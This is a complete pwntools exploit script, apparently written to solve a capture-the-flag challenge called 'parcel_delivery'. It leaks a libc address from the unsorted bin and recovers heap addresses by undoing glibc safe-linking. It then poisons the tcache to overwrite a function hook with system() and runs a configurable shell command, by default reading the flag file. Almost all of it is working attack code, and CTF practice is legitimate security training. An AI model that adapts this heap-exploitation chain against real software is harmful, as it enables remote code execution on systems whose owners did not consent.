#!/usr/bin/env python3

from pathlib import Path

from pwn import *

BASE_DIR = Path(__file__).resolve().parent
BINARY_PATH = BASE_DIR / "parcel_delivery"
LIBC_PATH = Path(args.LIBC or "/lib/x86_64-linux-gnu/libc.so.6")

context.binary = elf = ELF(str(BINARY_PATH), checksec=False)
context.log_level = args.LOG or "info"
context.timeout = 3

libc = ELF(str(LIBC_PATH), checksec=False)

HOST = args.HOST or "parcel-delivery-1aee4ede3ffd.chall.nnsc.tf"
PORT = int(args.PORT or 1337)
COMMAND = (args.CMD or "cat</flag.txt").encode()

MAIN_ARENA_OFFSET = 0x203AC0
UNSORTED_BIN_FD_DELTA = 0x60
SMALL_REQ = 0x18
LARGE_REQ = 0x500
FAKE_CHUNK_USER = 0x404060


def start():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)

    if args.GDB:
        return gdb.debug(
            [str(BINARY_PATH)],
            gdbscript="""
            set pagination off
            continue
            """,
        )

    return process([str(BINARY_PATH)])


def menu(io, choice):
    io.sendlineafter(b"> ", str(choice).encode())


def register(io, idx, size, data):
    if len(data) != size:
        raise ValueError(f"register payload length {len(data)} != requested size {size}")
    menu(io, 1)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Description: ", data)


def inspect(io, idx):
    menu(io, 2)
    io.sendlineafter(b"Index: ", str(idx).encode())
    return io.recvline(drop=True)


def update(io, idx, data, size):
    if len(data) > size:
        raise ValueError(f"update payload length {len(data)} > slot size {size}")
    menu(io, 3)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Description: ", data.ljust(size, b"X"))


def destroy(io, idx):
    menu(io, 4)
    io.sendlineafter(b"Index: ", str(idx).encode())


def dispatch(io, tracking_code):
    menu(io, 5)
    io.sendlineafter(b"Tracking code: ", tracking_code)


def leak_libc(io):
    register(io, 0, LARGE_REQ, b"A" * LARGE_REQ)
    register(io, 1, SMALL_REQ, b"B" * SMALL_REQ)
    destroy(io, 0)

    leak = inspect(io, 0)
    if len(leak) < 16:
        raise ValueError(f"unsorted leak too short: {leak!r}")

    fd = u64(leak[:8])
    bk = u64(leak[8:16])
    if fd != bk:
        raise ValueError(f"unexpected unsorted metadata: fd={fd:#x} bk={bk:#x}")

    libc.address = fd - UNSORTED_BIN_FD_DELTA - MAIN_ARENA_OFFSET
    log.info(f"unsorted fd = {fd:#x}")
    log.info(f"libc base   = {libc.address:#x}")
    log.info(f"system      = {libc.sym.system:#x}")


def recover_small_chunk_addresses(io):
    register(io, 2, SMALL_REQ, b"C" * SMALL_REQ)
    register(io, 3, SMALL_REQ, b"D" * SMALL_REQ)
    destroy(io, 2)
    destroy(io, 3)

    leak_a = inspect(io, 2)
    leak_b = inspect(io, 3)
    if len(leak_a) < 8 or len(leak_b) < 8:
        raise ValueError("heap leak too short")

    a_high = u64(leak_a[:8]) << 12
    encoded_next = u64(leak_b[:8])

    candidates = []
    for low in range(0, 0x1000, 0x10):
        chunk_a = a_high | low
        chunk_b = chunk_a + 0x30
        if (encoded_next ^ (chunk_b >> 12)) == chunk_a:
            candidates.append((chunk_a, chunk_b))

    if len(candidates) != 1:
        raise ValueError(f"unexpected heap candidates: {candidates!r}")

    chunk_a, chunk_b = candidates[0]
    log.info(f"chunk A user = {chunk_a:#x}")
    log.info(f"chunk B user = {chunk_b:#x}")
    return chunk_b


def overwrite_delivery_hook(io, chunk_b):
    poisoned_fd = FAKE_CHUNK_USER ^ (chunk_b >> 12)
    update(io, 3, p64(poisoned_fd), SMALL_REQ)

    register(io, 4, SMALL_REQ, b"E" * SMALL_REQ)
    register(io, 5, SMALL_REQ, b"PADDING!" + p64(libc.sym.system) + b"Z" * 8)
    log.info(f"delivery_hook = {elf.sym.delivery_hook:#x}")


def exploit(io):
    leak_libc(io)
    chunk_b = recover_small_chunk_addresses(io)
    overwrite_delivery_hook(io, chunk_b)
    dispatch(io, COMMAND)

    data = io.recvrepeat(2)
    if not data:
        raise EOFError("no output after dispatch")

    decoded = data.decode("latin-1", errors="replace")
    print(decoded, end="")

    if b"NNS{" not in data and b"flag" not in data.lower():
        log.warning("flag pattern not found in immediate output")


def main():
    io = start()
    try:
        exploit(io)
    finally:
        io.close()


if __name__ == "__main__":
    main()
